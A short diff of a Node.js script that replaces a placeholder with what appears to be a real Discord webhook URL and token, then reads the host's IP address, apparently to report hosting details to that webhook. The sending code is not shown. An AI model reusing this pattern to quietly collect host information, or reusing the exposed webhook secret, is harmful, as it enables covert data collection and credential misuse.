@@ -1,7 +1,7 @@
 const axios = require('axios');
 const os = require('os');
 
-const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+const discordWebhookUrl = 'https://discord.com/api/webhooks/1197326997601390726/yghXhncaKZsffaoCw82v33mw0vlj4QMwu3f8EYm193MYcATQoAwFYpf5_ozugP3Rk9yF';
 
 // Mendapatkan informasi IP dan spesifikasi hosting
 const ipAddress = require('ip').address();
